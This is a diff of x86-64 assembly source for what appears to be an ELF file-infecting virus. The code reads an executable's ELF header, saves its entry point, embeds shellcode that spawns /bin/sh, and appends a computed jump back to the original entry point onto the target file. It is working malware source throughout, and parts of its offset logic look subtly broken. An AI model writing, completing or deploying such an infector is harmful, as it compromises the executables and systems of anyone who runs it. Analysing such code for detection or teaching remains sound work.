@@ -10,6 +10,10 @@ section .data
   payload_message db 0x48, 0xb8, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x00, 0x50, 0x54, 0x5f, 0x31, 0xc0, 0x50, 0xb0, 0x3b, 0x54, 0x5a, 0x54, 0x5e, 0x0f, 0x05
   payload_msg_len equ $ - payload_message
 
+%define SEEK_END 2        ; SEEK_END constant for lseek syscall
+%define SYS_LSEEK 8       ; syscall number for lseek
+%define SYS_PWRITE64 18   ; syscall number for pwrite64
+%define SYS_SYNC 162      ; syscall number for sync
 
 section .bss
 ELF_Header: resb 64                    ; ELF header buffer
@@ -114,9 +118,7 @@ check_ELF_file:
 ; -----------------------------
 ; Function: save_entry_point
 ; This function save the virtual address entry_point from the elf header
-; It uses the 'write' syscall to display the data on the terminal.
 ; -----------------------------
-
 save_Important_field_ELF_Header:
   ; Save e_entry (Entry Point)
   mov rax, qword [ELF_Header + 0x18] ; Extract the 64-bit entry point
@@ -238,6 +240,38 @@ done_ph:
 payload:
     ; Shellcode to execute /bin/sh
     db 0x48, 0xb8, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x00, 0x50, 0x54, 0x5f, 0x31, 0xc0, 0x50, 0xb0, 0x3b, 0x54, 0x5a, 0x54, 0x5e, 0x0f, 0x05
+
+    ; Calculate the relative jump to the original entry point
+write_patched_jmp:
+    ; Get the current EOF (end of file)
+    mov rdi, [fd]                 ; File descriptor
+    mov rsi, 0                    ; Offset
+    mov rdx, SEEK_END             ; SEEK_END = 2
+    mov rax, SYS_LSEEK            ; lseek syscall
+    syscall                       ; rax = EOF offset
+
+    ; Calculate the relative jump offset
+    mov r8, [e_entry_point]       ; r8 = original entry point (0x5130)
+    mov r9, [ph_entry + 0x10]     ; r9 = payload vaddr
+    add r9, 5                     ; Add 5 for the jmp instruction size
+    sub r8, r9                    ; Calculate the relative offset
+    sub r8, payload_msg_len       ; Account for the payload size
+
+    ; Write the `jmp` instruction to the end of the payload
+    mov byte [ph_entry], 0xe9     ; e9 = opcode for relative jump
+    mov dword [ph_entry + 1], r8d ; Write the 32-bit relative offset
+
+    ; Append the jmp instruction to the file
+    mov rdi, [fd]                 ; File descriptor
+    lea rsi, [ph_entry]           ; Buffer containing the jmp instruction
+    mov rdx, 5                    ; Size of the jmp instruction
+    mov r10, rax                  ; r10 = EOF offset
+    mov rax, SYS_PWRITE64         ; pwrite syscall
+    syscall
+
+    ; Ensure filesystem caches are written
+    mov rax, SYS_SYNC
+    syscall
 
 ; -----------------------------
 ; Function: write_at_offset
